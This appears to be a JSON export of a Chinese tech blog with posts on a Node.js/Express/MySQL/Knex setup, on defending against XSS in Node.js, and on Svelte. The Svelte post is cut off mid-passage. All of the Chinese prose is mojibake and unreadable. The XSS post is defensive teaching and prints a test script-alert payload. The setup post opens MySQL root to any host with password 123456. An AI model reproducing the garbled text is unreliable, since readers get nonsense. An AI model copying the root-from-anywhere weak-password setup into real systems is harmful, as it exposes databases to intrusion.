ä»¥ä¸‹æ¡ç”¨æ–¹æ³•2è§£æ±ºï¼Œæ“ä½œå¦‚ä¸‹ï¼š\n1. æ‰“é–‹ cmdï¼Œè¼¸å…¥ä»¥ä¸‹æŒ‡ä»¤ä»¥ bash é€²å…¥å®¹å™¨ï¼š 1 2 # docker exec -it {å®¹å™¨å} bash docker exec -it mysql-test bash 2. ä½¿ç”¨ mysql æŒ‡ä»¤é€£ç·šè³‡æ–™åº«ï¼š 1 mysql -u root -p 3. ä½¿ç”¨ mysql æŒ‡ä»¤æŸ¥è©¢ç”¨æˆ¶è¨Šæ¯ï¼š 1 select host, user, plugin, authentication_string from mysql.user; host ç‚º % è¡¨ç¤ºä¸é™åˆ¶ ipã€localhost è¡¨ç¤ºæœ¬æ©Ÿä½¿ç”¨\nplugin é mysql_native_password å‰‡éœ€è¦ä¿®æ”¹å¯†ç¢¼\n4. ä½¿ç”¨ mysql æŒ‡ä»¤ä¿®æ”¹å¯†ç¢¼ï¼š æ›´æ–° user ç‚º rootï¼Œ host ç‚º % çš„å¯†ç¢¼ç‚º 123456 1 ALTER USER \u0026#39;root\u0026#39;@\u0026#39;%\u0026#39; IDENTIFIED WITH mysql_native_password BY \u0026#39;123456\u0026#39;; æ›´æ–° user ç‚º rootï¼Œ host ç‚º localhost çš„å¯†ç¢¼ç‚º 123456 1 ALTER USER \u0026#39;root\u0026#39;@\u0026#39;localhost\u0026#39; IDENTIFIED WITH mysql_native_password BY \u0026#39;123456\u0026#39;; 5. å†æ¬¡åœ¨ Navicat ä¸­é€£æ¥ mysqlï¼Œé€£æ¥æˆåŠŸ å‰µå»ºæ•¸æ“šåº« ä½¿ç”¨æ•¸æ“šåº«ç®¡ç†å·¥å…·æ–°å»ºæ•¸æ“šåº« database åç¨±ç‚ºï¼šexpressFrame\né€²å…¥ expressFrame åº«ï¼Œæ–°å»ºç”¨æˆ¶ä¿¡æ¯è¡¨ç‚º user ï¼Œé»˜èªæœ‰ id å­—æ®µï¼Œéœ€è¦å†æ·»åŠ ä»¥ä¸‹å¿…è¦å­—æ®µï¼š\nå­—æ®µï¼šid\n1 2 Field:name Type:VARCHAR LENGTH:255 Comment:å§“å Field:phone Type:VARCHAR LENGTH:255 Comment:æ‰‹æ©Ÿè™Ÿ ä½¿ç”¨ Knex.js å¢åˆªæ”¹æŸ¥æ•¸æ“šåº« Knex.js æ˜¯ç‚º Postgresã€MSSQLã€MySQLã€MariaDBã€SQLite3ã€Oracle å’Œ Amazon Redshift è¨­è¨ˆçš„ SQL æŸ¥è©¢æ§‹å»ºå™¨ï¼Œå…¶è¨­è¨ˆéˆæ´»ï¼Œä¾¿æ–¼æ”œå¸¶ä¸¦ä¸”ä½¿ç”¨èµ·ä¾†éå¸¸æœ‰è¶£ã€‚Knex çš„ä¸»è¦ç›®æ¨™ç’°å¢ƒæ˜¯ Node.jsï¼Œæ‚¨éœ€è¦å®‰è£è©² knex åº«ï¼Œç„¶å¾Œå®‰è£é©ç•¶çš„æ•¸æ“šåº«åº«ï¼špg é©ç”¨æ–¼ PostgreSQLã€CockroachDB å’Œ Amazon Redshiftï¼Œpg-native å°æ–¼å…·æœ‰æœ¬æ©Ÿ C++ libpq ç¶å®šçš„ PostgreSQLï¼ˆéœ€è¦å®‰è£ PostgresSQL æ‰èƒ½éˆæ¥ï¼‰ï¼Œmysql é©ç”¨æ–¼ MySQL æˆ– MariaDBï¼Œsqlite3 é©ç”¨æ–¼ SQLite3ï¼Œtedious é©ç”¨æ–¼ MSSQLã€‚\nFlag Library pg PostgreSQLã€CockroachDBã€Amazon Redshift pg-native æœ¬æ©Ÿ C++ libpq ç¶å®šçš„ PostgreSQLï¼ˆéœ€è¦å®‰è£ PostgresSQL æ‰èƒ½éˆæ¥ï¼‰ mysql MySQLã€MariaDB sqlite3 SQLite3 tedious MSSQL ä¸‹è¼‰ç›¸é—œä¾è³´ 1 npm install -save knex mysql æ·»åŠ é…ç½®ä¿¡æ¯ åœ¨é …ç›®æ ¹ç›®éŒ„ä¸‹ï¼Œæ–°å»ºé…ç½®ä¿¡æ¯ config.jsï¼Œä¹‹å¾Œçš„é…ç½®ä¿¡æ¯æ¶‰åŠåˆ°æ•¸æ“šåº«å’Œå¯†ç¢¼ï¼Œä¸ä¸Šå‚³åˆ° Github ç­‰è¨—ç®¡å¹³å°ï¼Œæ‰€ä»¥éœ€è¦å–®ç¨è¨­ç½®ï¼Œä½¿ç”¨ .gitignore é¿å…ä¸Šå‚³ã€‚ä¹‹å¾Œæ•æ„Ÿçš„é…ç½®ä¿¡æ¯ï¼Œéƒ½å°‡åœ¨æ­¤é…ç½®ã€‚host åœ°å€ç‚ºæ•¸æ“šåº«çš„æœå‹™åœ°å€ï¼Œæœ¬åœ°ç‚º 127.0.0.1\nconfig.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 const configs = { mysql: { host: \u0026#39;127.0.0.1\u0026#39;, port: \u0026#39;3306\u0026#39;, user: \u0026#39;root\u0026#39;, password: \u0026#39;123456\u0026#39;, // è‡ªå·±è¨­ç½®çš„å¯†ç¢¼ database: \u0026#39;expressFrame\u0026#39; // æ•¸æ“šåº«çš„åå­— }, // æ‰“å°é”™è¯¯ log: { error (message) { console.log(\u0026#39;[knex error]\u0026#39;, message) } } } module.exports = configs æ–°å»º .gitignore åœ¨é …ç›®æ ¹ç›®éŒ„ä¸‹ï¼Œæ–°å»º .gitignore é¿å…ä¸Šå‚³ config.js ã€logã€ node_modules ç­‰ä¸éœ€è¦è¢«ä¸Šå‚³åˆ° Github çš„æ–‡ä»¶ã€‚\n.gitignore 1 2 3 4 5 6 7 .DS_Store .idea npm-debug.log yarn-error.log node_modules log config.js æ•¸æ“šåº«é…ç½® æ–°å»º models/knex.jsï¼Œåˆå§‹åŒ–é…ç½® knex\nmodels/knex.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 // å¼•ç”¨é…ç½®æ–‡ä»¶ const configs = require(\u0026#39;../config\u0026#39;); // æŠŠé…ç½®æ–‡ä»¶ä¸­çš„ä¿¡æ¯ï¼Œè¨­ç½®åœ¨åˆå§‹åŒ–é…ç½®ä¸­ module.exports = require(\u0026#39;knex\u0026#39;)({ client: \u0026#39;mysql\u0026#39;, connection: { host: configs.mysql.host, port: configs.mysql.port, user: configs.mysql.user, password: configs.mysql.password, database: configs.mysql.database }, // æ‰“å°éŒ¯èª¤ log: { error (message) { console.log(\u0026#39;[knex error]\u0026#39;, message) } } }) knex å¢åˆªæ”¹æŸ¥ åœ¨ models ä¸‹æ–°å»ºæ–‡ä»¶ base.js\nmodels/base.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 const knex = require(\u0026#39;../models/knex\u0026#39;); class Base{ constructor(props){ this.table = props; } // æŸ¥æ‰¾ all (){ return knex(this.table).select(); } // æ–°å¢ insert (params){ return knex(this.table).insert(params); } // æ›´æ”¹ update (id, params){ return knex(this.table).where(\u0026#39;id\u0026#39;, \u0026#39;=\u0026#39;, id).update(params); } // åˆ é™¤ delete (id){ return knex(this.table).where(\u0026#39;id\u0026#39;, \u0026#39;=\u0026#39;, id).del(); } } module.exports = Base; æ–°å»ºç”¨æˆ¶æ¨¡å‹ åœ¨ models ä¸‹æ–°å»ºæ–‡ä»¶ user.js\nmodels/user.js 1 2 3 4 5 6 7 8 9 10 const Base = require(\u0026#39;./base\u0026#39;); class User extends Base { // å®šç¾©åƒæ•¸é»˜èªå€¼ç‚º user è¡¨ constructor(props = \u0026#39;user\u0026#39;){ super(props); } } module.exports = new User(); æ–°å»ºç”¨æˆ¶æ§åˆ¶å™¨ åœ¨æ ¹ç›®éŒ„æ–°å»ºæ§åˆ¶å™¨æ–‡ä»¶å¤¾ controllersï¼Œåœ¨ controllers æ–°å»º user.jsï¼Œä¸¦è¨­ç½® showUser æ–¹æ³•\ncontrollers/user.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 // å¼•ç”¨ç”¨æˆ·æ¨¡ç‰ˆæ•°æ® const User = require(\u0026#39;../models/user.js\u0026#39;); const userController = { // showUser ç²å–ç”¨æˆ¶æ•¸æ“šä¸¦è¿”å›åˆ°é é¢ showUser: async function(req,res,next){ try{ let userData = await User.all() res.json({ code: 200, message: \u0026#34;æ“ä½œæˆåŠŸ\u0026#34;, data: userData }) }catch(e){ res.json({ code: 0, message: \u0026#34;æ“ä½œå¤±æ•—\u0026#34;, data: e }) } }, } module.exports = userController; æ·»åŠ ç²å–ç”¨æˆ¶æ¥å£ ä¿®æ”¹è·¯ç”± routes/index.jsï¼Œæ·»åŠ ç²å–ç”¨æˆ¶ä¿¡æ¯çš„æ¥å£\nroutes/index.js 1 2 3 4 const userController = require(\u0026#39;../controllers/user\u0026#39;); // ç²å–ç”¨æˆ¶ä¿¡æ¯ router.get(\u0026#39;/get_user\u0026#39;, userController.showUser); æ¸¬è©¦æ¥å£ è¨ªå•ä¸€ä¸‹ http://localhost:3000/get_user\næŸ¥çœ‹æ¥å£è¿”å›çš„æ•¸æ“š\né€™å°±å¤§åŠŸå‘Šæˆå•¦ï½\ngithubåœ°å€ï¼šhttps://github.com/wjdesign/nodejsExpressMysqlDemo\nèµ°éè·¯éé»å€‹è´Šå”„ï½\n","date":"2022-10-21T00:00:00Z","image":"https://live.staticflickr.com/65535/52443177409_7e96fe402c_o.png","permalink":"https://wayneblog.ga/2022-10-21/nodejs-express-mysql/","title":"Node.js + Express + MySQL æ­å»ºé …ç›®æ¡†æ¶"},{"content":" åƒè€ƒç¶²ç«™\nç°¡ä»‹ xss æ˜¯å¸¸è¦‹çš„æ”»æ“Šæ–¹å¼ä¹‹ä¸€ï¼Œä¸ç®¡æ˜¯å‰ç«¯é‚„æ˜¯å¾Œç«¯éƒ½è¦å°æ­¤æœ‰æ‰€é˜²ç¯„æ‰è¡Œã€‚\næœ¬æ–‡ä¸»è¦è¬›è§£ä½¿ç”¨ NodeJS é–‹ç™¼çš„å¾Œç«¯ç¨‹åºæ‡‰è©²å¦‚ä½•é˜²ç¯„ xss æ”»æ“Šã€‚\nxssæ¼”ç¤º xss æ”»æ“Šæ–¹å¼ä¸»è¦æ˜¯åœ¨åœ¨é é¢å±•ç¤ºå…§å®¹ä¸­æ‘»é›œ jsä»£ç¢¼ï¼Œä»¥ç²å–ç¶²é ä¿¡æ¯ã€‚\nå¸¸è¦‹çš„æ”»æ“Šåœ°æ–¹æœ‰ï¼š\né›»å•†ç”¢å“è©•åƒ¹å€ï¼šæŸç”¨æˆ¶æäº¤çš„è©•åƒ¹å¸¶æœ‰å¯åŸ·è¡Œçš„jsä»£ç¢¼ï¼Œå…¶ä»–ç”¨æˆ¶æŸ¥çœ‹è©²è©•è«–æ™‚å°±æœƒåŸ·è¡Œé‚£æ®µjsä»£ç¢¼ã€‚ åšå®¢ç¶²ç«™ï¼šæŸç”¨æˆ¶åœ¨åšå®¢çš„æ¨™é¡Œæˆ–è€…å…§å®¹ä¸­å¸¶æœ‰å¯åŸ·è¡Œçš„jsä»£ç¢¼ï¼Œå…¶ä»–ç”¨æˆ¶æŸ¥çœ‹è©²åšå®¢æ™‚é‚£æ®µ jsä»£ç¢¼ å°±æœƒè¢«åŸ·è¡Œã€‚ æ¯”å¦‚åœ¨è¼¸å…¥æ¡†è¼¸å…¥\n1 \u0026lt;script\u0026gt;alert(1234)\u0026lt;/script\u0026gt; åˆ¥çš„ç”¨æˆ¶åœ¨è‡ªå·±é é¢è¦å±•ç¤ºä¸Šé¢é€™æ®µå…§å®¹å€‹ï¼Œé é¢æœ‰å¯èƒ½æœƒå½ˆå‡ºä¸€å€‹å½ˆçª—ã€‚\né€™å€‹ä¾‹å­åªæ˜¯å½ˆå‡ºä¸€å€‹å°è©±æ¡†ï¼Œå¦‚æœäººå®¶æœ‰æƒ¡æ„ï¼Œç²å–cookie ç­‰ä¿¡æ¯ï¼Œç„¶å¾Œå‚³çµ¦è‡ªå·±çš„æœå‹™å™¨ï¼Œé‚£å¾ŒæœçœŸçš„å¾ˆåš´é‡ã€‚\nxssé˜²ç¦¦ é é˜²æªæ–½ï¼šè½‰ç¾©ç‰¹æ®Šå­—ç¬¦\nç‰¹æ®Šç¬¦è™Ÿè½‰æ›\n1 2 3 4 5 6 \u0026amp; -\u0026gt; \u0026amp;amp; \u0026lt; -\u0026gt; \u0026amp;lt; \u0026gt; -\u0026gt; \u0026amp;gt; \u0026#34; -\u0026gt; \u0026amp;quot; \u0026#39; -\u0026gt; \u0026amp;#x27; / -\u0026gt; \u0026amp;#x2F; ä¸Šé¢æˆ‘ç¾…åˆ—äº†å¹¾å€‹å¸¸è¦‹çš„ç‰¹æ®Šå­—ç¬¦ã€‚å¾ä¸Šé¢çš„ä¾‹å­å¯ä»¥çœ‹å‡ºï¼Œè¼¸å…¥äº† \u0026lt;script\u0026gt; æ¨™ç±¤å¾Œï¼Œè£¡é¢çš„å…§å®¹æœ‰å¯èƒ½æœƒè¢«åŸ·è¡Œã€‚\nå¦‚æœæˆ‘å€‘æŠŠ \u0026lt;script\u0026gt; æ”¹æˆ \u0026amp;lt;script\u0026amp;gt; é‚£éº¼ç€è¦½å™¨å°±ä¸æŠŠé€™æ®µå…§å®¹çœ‹æˆæ˜¯å¯åŸ·è¡Œä»£ç¢¼ã€‚\nåœ¨æ—¥å¸¸é–‹ç™¼ä¸­ï¼Œæˆ‘å€‘ä¸éœ€è¦è‡ªå·±ç·¨å¯«è½‰ç¾©åŠŸèƒ½çš„ä»£ç¢¼ï¼Œåªéœ€è¦ä¸‹è¼‰ xss çš„ä¾è³´åŒ…å°±è¡Œã€‚\nå®‰è£ xss ä¾è³´åŒ…\n1 npm install xss --save ä½¿ç”¨ xssã€‚ xss å…¶å¯¦æ˜¯ä¸€å€‹æ–¹æ³•ï¼Œåªéœ€è¦æŠŠè¦è½‰ç¾©çš„å…§å®¹å‚³å…¥ xss æ–¹æ³•å³å¯ã€‚\n1 2 3 4 const xss = require(\u0026#39;xss\u0026#39;) const content = xss(\u0026#39;\u0026lt;script\u0026gt;alert(1234)\u0026lt;/script\u0026gt;\u0026#39;) console.log(content) æœ€å¾Œè¼¸å‡º\n1 \u0026amp;lt;script\u0026amp;gt;alert(1234)\u0026amp;lt;/script\u0026amp;gt; ä»¥ä¸Šå°±æ˜¯ xssæ”»æ“Š åœ¨å¾Œç«¯çš„é˜²ç¦¦æ–¹æ³•ã€‚\nå¦‚æœåš´è¬¹ä¸€é»çš„è©±ï¼Œåœ¨å‰ç«¯ä¹Ÿå¯ä»¥æŠŠæ–‡æœ¬åŸŸçš„å…§å®¹è£¡çš„ç‰¹æ®Šå­—ç¬¦è½‰ç¾©ä¸€éå†å‚³çµ¦å¾Œç«¯ã€‚\nå¾Œç«¯å‚³çµ¦å‰ç«¯çš„å…§å®¹æœ‰å¯èƒ½æœƒåœ¨é é¢å±•ç¤ºæˆ \u0026amp;lt;script\u0026amp;gt;alert(1234)\u0026amp;lt;/script\u0026amp;gt;ï¼Œé€™éƒ¨åˆ†éœ€è¦å‰ç«¯è‡ªå·±å»è™•ç†ã€‚\næ’å‰‡èŠ±é‚Šæ–°è\nä¹‹å‰çœ‹åˆ°æœ‰å‰‡æ–°èèªª Vue ä¸å®‰å…¨ï¼ŒæŸäº›ZFé …ç›®ä¸­ä½¿ç”¨ Vue å—åˆ°äº† xss æ”»æ“Šã€‚å¾Œç«¯ç”©é‹çµ¦å‰ç«¯ï¼Œå‰ç«¯ç”©é‹çµ¦äº† Vueã€‚\nå¾Œä¾†è½èªªæ˜¯å‰ç«¯èƒ¡äº‚ä½¿ç”¨ v-html æ¸²æŸ“å…§å®¹å°è‡´çš„ï¼Œè€Œ v-html é€™æ±è¥¿å®˜æ–¹æ–‡æª”ä¹Ÿæç¤ºäº†æœ‰å¯èƒ½å—åˆ° xss æ”»æ“Šã€‚\nå°¤é›¨æºªï¼šå¾ˆå¤šäººå°±æ˜¯ä¸çœ‹æ–‡æª”\n","date":"2022-10-21T00:00:00Z","image":"https://live.staticflickr.com/65535/52442821071_35fc2e7087_o.png","permalink":"https://wayneblog.ga/2022-10-21/nodejs-prevent-xss/","title":"NodeJS é˜²æ­¢ xss æ”»æ“Š"},{"content":" åƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nå…¶å¯¦åœ¨å¾ˆä¹…ä¹‹å‰æˆ‘å°±æ³¨æ„åˆ° Svelteï¼Œä½†ä¸€ç›´æ²’æŠŠé€™å€‹æ¡†æ¶æ”¾åœ¨å¿ƒä¸Šã€‚\nå› ç‚ºæˆ‘ä¹‹å‰çš„å·¥ä½œä¸»è¦ä½¿ç”¨ Vueï¼Œä½†å®Œå…¨æ²’é‡åˆ°éä½¿ç”¨ Svelte çš„é …ã€‚\nç›´åˆ° Vite çš„å‡ºç¾ï¼Œæˆ‘æ‰é–‹å§‹é–‹å§‹é‡è¦– Svelteã€‚\nå¾ Vite æ–‡æª” è£¡å¯ä»¥çœ‹åˆ°å®ƒæ”¯æŒé€™äº›æ¨¡æ¿ï¼š\nJavaScript TypeScript vanilla vanilla vue vue react react preact preact lit lit svelte svelte èƒ½è®“ç¥–å¸«çˆºä¹Ÿé‡è¦–çš„æ¡†æ¶ï¼Œä¸ç°¡å–®ä¸ç°¡å–®~\næˆ‘å–œæ­¡ç”¨ Demo çš„æ–¹å¼å­¸ç¿’æ–°æŠ€è¡“ï¼ŒSvelte å®˜æ–¹å…¥é–€æ•™ç¨‹ å°±æä¾›äº†é€™ç¨®æ–¹å¼ã€‚\né€™æ˜¯æˆ‘è¦ºå¾—å…¥é–€æ¯”è¼ƒèˆ’æœä¸”æ–¹ä¾¿æ—¥å¾Œæœç´¢çš„å­¸ç¿’æ–¹å¼ã€‚\né›–ç„¶ Svelte å®˜æ–¹å…¥é–€æ•™ç¨‹ å·²ç¶“çµ¦å‡ºå¾ˆå¤šä¾‹å­ï¼Œè€Œä¸” Svelteä¸­æ–‡ç¶² ä¹Ÿæœ‰å°æ‡‰çš„ç¿»è­¯ï¼Œä½†æœ‰äº›ç¿»è­¯çœ‹ä¸Šå»æ˜¯æ©Ÿè­¯ï¼Œè€Œä¸”éƒ¨åˆ†æ¡ˆä¾‹å¯èƒ½ä¸å¤ªé©åˆæ–°æ‰‹å­¸ç¿’~\næœ¬æ–‡çš„ç›®çš„æ˜¯æŠŠ Svelte çš„å­¸ç¿’æµç¨‹æ¢³ç†å‡ºä¾†ï¼Œè®“ç¬¬ä¸€æ¬¡æ¥è§¸ Svelte çš„å·¥å‹èƒ½é †åˆ©ä¸Šæ‰‹ã€‚\næœ¬æ–‡é©åˆäººç¾¤ï¼šæœ‰HTMLã€CSSã€JSåŸºç¤ï¼ŒçŸ¥é“ä¸¦å·²ç¶“å®‰è£äº†Nodeã€‚\nå¦‚æœä½ æ˜¯æ‰“ç®—å¾0é–‹å§‹å­¸ç¿’å‰ç«¯ï¼Œé‚£æœ¬æ–‡æš«æ™‚é‚„ä¸é©åˆä½ é–±è®€ã€‚\nSvelte ç°¡ä»‹ Svelte æ˜¯ä¸€å€‹æ§‹å»ºweb æ‡‰ç”¨ç¨‹åºçš„å·¥å…·ã€‚\nå‚³çµ±æ¡†æ¶å¦‚React å’ŒVue åœ¨ç€è¦½å™¨ä¸­éœ€è¦åšå¤§é‡çš„å·¥ä½œï¼Œè€ŒSvelte å°‡é€™äº›å·¥ä½œæ”¾åˆ°æ§‹å»ºæ‡‰ç”¨ç¨‹åºçš„ç·¨è­¯éšæ®µä¾†è™•ç†ã€‚\néœ€è¦æ³¨æ„ï¼ŒSvelte æ˜¯ä¸€æ¬¾ç·¨è­¯å™¨ã€‚å®ƒå¯ä»¥å°‡æŒ‰ç…§è¦å®šèªæ³•ç·¨å¯«çš„ä»£ç¢¼æ‰“åŒ…æˆç€è¦½å™¨èƒ½é‹è¡Œçš„é …ç›®ã€‚\nå’Œå…¶ä»–å‰ç«¯æ¡†æ¶ä¸€æ¨£ï¼ŒåŒæ¨£ä¹Ÿæ˜¯ä½¿ç”¨HTMLã€CSS å’Œ JavaScript é€²è¡Œé–‹ç™¼ã€‚\nä½œè€… åœ¨å­¸ç¿’ Svelte ä¹‹å‰å…ˆäº†è§£ä¸€ä¸‹å®ƒçš„çˆ¶è¦ªï¼ˆä½œè€…ï¼‰ã€‚\nSvelte çš„ä½œè€…å« Rich Harris\nå¯èƒ½åœ‹å…§å¤§å¤šæ•¸å·¥å‹å°ä»–ä¸æ˜¯å¾ˆç†Ÿæ‚‰ï¼ˆæˆ‘ä¹Ÿå®Œå…¨ä¸ç†Ÿï¼‰ï¼Œä½†æ‡‰è©²è½é Rollupã€‚\næ²’éŒ¯ï¼Œä»–ä¹Ÿæ˜¯ Rollup çš„çˆ¸çˆ¸ã€‚\nä»–åœ¨é–‹ç™¼ Svelte ä¹‹å‰é‚„é–‹ç™¼é Ractive.jsï¼Œè½èªª Vue çš„éƒ¨åˆ†å¯¦ç¾ä¹Ÿæ˜¯å—åˆ°äº† Ractive çš„å•Ÿç™¼ã€‚\né—œæ–¼ Rich Harris çš„ä»‹ç´¹é‚„æœ‰å¾ˆå¤šï¼Œæˆ‘æœåˆ°çš„è³‡æ–™ä¸Šé€™æ¨£ä»‹ç´¹åˆ°ï¼š\nå¤§å­¸å°ˆæ¥­æ˜¯å­¸å“²å­¸çš„ åœ¨ç´ç´„æ™‚å ±èª¿æŸ¥çµ„å·¥ä½œçš„åœ–å½¢ç·¨è¼¯ï¼Œèº«å…¼è¨˜è€…å’Œé–‹ç™¼è€…è·ä½ é‚„æœ‰æ›´å¤šé—œæ–¼ä»–å’Œ Svelte çš„ä»‹ç´¹ï¼Œå¯ä»¥çœ‹çœ‹ã€ŠSvelte - The magical disappearing UI framework - Interview with Rich Harrisã€‹\nSvelte çš„å„ªå‹¢ Svelte ç¿»è­¯æˆä¸­æ–‡å°±æ˜¯ è‹—æ¢ çš„æ„æ€ï¼Œå´é¢è¡¨æ˜å®ƒæ‰“åŒ…å‡ºä¾†çš„åŒ…éå¸¸å°ã€‚\nSvelte ä¸»è¦å„ªå‹¢æœ‰ä»¥ä¸‹å¹¾é»ã€‚\nç·¨è­¯å™¨ åœ¨æ‰“é–‹ Svelteå®˜ç¶² æ™‚å°±èƒ½çœ‹åˆ°é€™æ¨£çš„ä»‹ç´¹ã€‚\nSvelte æ˜¯ä¸€ç¨®å…¨æ–°çš„æ§‹å»ºç”¨æˆ¶ç•Œé¢çš„æ–¹æ³•ã€‚å‚³çµ±æ¡†æ¶å¦‚ React å’Œ Vue åœ¨ç€è¦½å™¨ä¸­éœ€è¦åšå¤§é‡çš„å·¥ä½œï¼Œè€Œ Svelte å°‡é€™äº›å·¥ä½œæ”¾åˆ°æ§‹å»ºæ‡‰ç”¨ç¨‹åºçš„ç·¨è­¯éšæ®µä¾†è™•ç†ã€‚\nSvelte çµ„ä»¶éœ€è¦åœ¨ .svelte å¾Œç¶´çš„æ–‡ä»¶ä¸­ç·¨å¯«ï¼ŒSvelte æœƒå°‡ç·¨å¯«å¥½çš„ä»£ç¢¼ç¿»ç·¨è­¯ JS å’Œ CSS ä»£ç¢¼ã€‚\næ‰“åŒ…é«”ç©æ›´å° Svelte åœ¨æ‰“åŒ…æœƒå°‡å¼•ç”¨åˆ°çš„ä»£ç¢¼æ‰“åŒ…èµ·ä¾†ï¼Œè€Œæ²’å¼•ç”¨éçš„ä»£ç¢¼å°‡æœƒè¢«éæ¿¾æ‰ï¼Œæ‰“åŒ…æ™‚ä¸æœƒåŠ å…¥é€²ä¾†ã€‚\nåœ¨ ã€ŠA RealWorld Comparison of Front-End Frameworks with Benchmarks (2019 update)ã€‹ å ±å‘Šä¸­ï¼Œå°ä¸»æµæ¡†æ¶é€²è¡Œäº†å°æ¯”ã€‚\nåœ¨ç¶“é gzip å£“ç¸®å¾Œç”Ÿæˆçš„åŒ…å¤§å°ï¼Œå¾å ±å‘Šä¸­å¯ä»¥çœ‹å‡ºï¼ŒSvelte æ‰“åŒ…å‡ºä¾†çš„é«”ç©ç”©é–‹ Vueã€React å’Œ Angular å¹¾æ¢è¡—ã€‚\né€™æ˜¯å› ç‚ºç¶“é Svelte ç·¨è­¯çš„ä»£ç¢¼ï¼Œåƒ…ä¿ç•™å¼•ç”¨åˆ°çš„éƒ¨åˆ†ã€‚\nä¸ä½¿ç”¨ Virtual DOM Virtual DOM å°±æ˜¯ è™›æ“¬DOMï¼Œæ˜¯ç”¨ JS å°è±¡æè¿° DOM ç¯€é»çš„æ•¸æ“šï¼Œç”± React åœ˜éšŠæ¨å»£å‡ºä¾†çš„ã€‚\nè™›æ“¬DOM æ˜¯å‰ç«¯çš„ç¶²ç´…ï¼Œå› æ­¤ä¹Ÿæœ‰å¾ˆå¤šé–‹ç™¼è€…é–‹å§‹ç ”ç©¶å’Œæè¾¯è«–è³½ã€‚\nç¶²ä¸Šæœ‰ä¸€å¼µåœ–å°æ¯”äº† Svelte å’Œ React åœ¨æ•¸æ“šé©…å‹•è¦–åœ–çš„æµç¨‹\nå…¶å¯¦ä¸»è¦å°æ¯”äº†ä½¿ç”¨è™›æ“¬DOMå’Œç›´æ¥æ“ä½œçœŸå¯¦DOMçš„å€åˆ¥ã€‚ åœ¨ React ä¸­å¯¦ç¾æ•¸æ“šé©…å‹•è¦–åœ–å¤§æ¦‚æµç¨‹æ˜¯é€™æ¨£çš„ï¼š\n1 æ•¸æ“šç™¼ç”Ÿè®ŠåŒ– -\u0026gt; é€šédiffç®—æ³•åˆ¤æ–·è¦æ›´æ–°å“ªäº›ç¯€é» -\u0026gt; æ‰¾åˆ°è¦æ›´æ–°çš„ç¯€é» -\u0026gt; æ›´æ–°çœŸå¯¦DOM Vue çš„æ•¸æ“šæ›´æ–°åŸç†å…¶å¯¦ä¹Ÿå·®ä¸å¤šï¼Œåªæ˜¯å¯¦ç¾æ–¹å¼å’Œä½¿ç”¨èªæ³•æœƒæœ‰æ‰€ä¸åŒã€‚\ndiffç®—æ³• æœƒæ ¹æ“šæ•¸æ“šæ›´æ–°å‰å’Œæ›´æ–°å¾Œç”Ÿæˆçš„è™›æ“¬DOMé€²è¡Œå°æ¯”ï¼Œåªæœ‰å…©å€‹ç‰ˆæœ¬çš„è™›æ“¬DOMå­˜åœ¨å·®ç•°æ™‚ï¼Œæ‰æœƒæ›´æ–°å°æ‡‰çš„çœŸå¯¦DOMã€‚\nä½¿ç”¨è™›æ“¬DOMå°æ¯”çš„æ–¹å¼æœƒæ¯”ç›´æ¥å°æ¯”çœŸå¯¦DOMçš„æ•ˆç‡é«˜ã€‚\nè€Œä¸”çœŸå¯¦DOMèº«ä¸Šæ›è¼‰çš„å±¬æ€§å’Œæ–¹æ³•éå¸¸å¤šï¼Œä½¿ç”¨è™›æ“¬DOMçš„æ–¹å¼å»æè¿°DOMç¯€é»æ¨¹æœƒé¡¯å¾—æ›´è¼•ä¾¿ã€‚\nä½†é€™ä¹Ÿæ„å‘³è‘—æ¯æ¬¡æ•¸æ“šç™¼ç”Ÿè®ŠåŒ–æ™‚éƒ½è¦å…ˆå‰µå»ºä¸€å€‹è™›æ“¬DOMï¼Œä¸¦ä½¿ç”¨ diffç®—æ³• å°‡æ–°è™›æ“¬DOMèˆ‡èˆŠè™›æ“¬DOMé€²è¡Œæ¯”å°ï¼Œé€™å€‹æ­¥é©Ÿæœƒæ¶ˆè€—ä¸€é»æ€§èƒ½å’Œéœ€è¦ä¸€é»åŸ·è¡Œæ™‚é–“ã€‚\nè€Œ Svelte åœ¨æœªä½¿ç”¨è™›æ“¬DOMçš„æƒ…æ³ä¸‹å¯¦ç¾äº†éŸ¿æ‡‰å¼è¨­è¨ˆã€‚\næˆ‘ä»¥ç²—æš´çš„æ–¹å¼ç†è§£ï¼šSvelte æœƒç›£è½é ‚å±¤çµ„ä»¶æ‰€æœ‰è®Šé‡ï¼Œä¸€æ—¦æŸå€‹è®Šé‡ç™¼ç”Ÿè®ŠåŒ–ï¼Œå°±æ›´æ–°ä½¿ç”¨éè©²è®Šé‡çš„çµ„ä»¶ã€‚é€™å°±åƒ…åƒ…åªéœ€æ›´æ–°å—å½±éŸ¿çš„é‚£éƒ¨åˆ†DOMå…ƒç´ ï¼Œè€Œä¸éœ€è¦æ•´å€‹çµ„ä»¶æ›´æ–°ã€‚\nç¶œä¸Šæ‰€è¿°ï¼Œåœ¨æˆ‘çš„ç†è§£åŠ›ï¼Œè™›æ“¬DOMçš„æ€æƒ³å¾ˆå„ªç§€ï¼Œä¹Ÿæ˜¯é †æ‡‰æ™‚ä»£çš„ç”¢ç‰©ï¼Œä½†è™›æ“¬DOMä¸¦ä¸æ˜¯æœ€å¿«çš„ï¼ŒJS ç›´æ¥æ“ä½œ DOM æ‰æ˜¯æœ€å¿«ã€‚\nã€ŠVirtual DOM is pure overheadã€‹æ˜¯ Svelte å®˜ç¶²ä¸Šçš„ä¸€ç¯‡åšå®¢ï¼Œå°ˆé–€è¨è«–è™›æ“¬DOMã€‚æœ‰èˆˆè¶£çš„å·¥å‹å¯ä»¥çœ‹çœ‹~\næ›´è‡ªç„¶çš„éŸ¿æ‡‰å¼ é€™è£¡èªªçš„éŸ¿æ‡‰å¼è¨­è¨ˆæ˜¯åªé—œæ–¼æ•¸æ“šçš„éŸ¿æ‡‰ï¼Œè€Œä¸æ˜¯åƒ Bootstrap çš„éŸ¿æ‡‰å¼ä½ˆå±€ã€‚\nç¾åœ¨æµè¡Œçš„å‰ç«¯æ¡†æ¶åŸºæœ¬éƒ½ä½¿ç”¨ æ•¸æ“šé©…å‹•è¦–åœ– 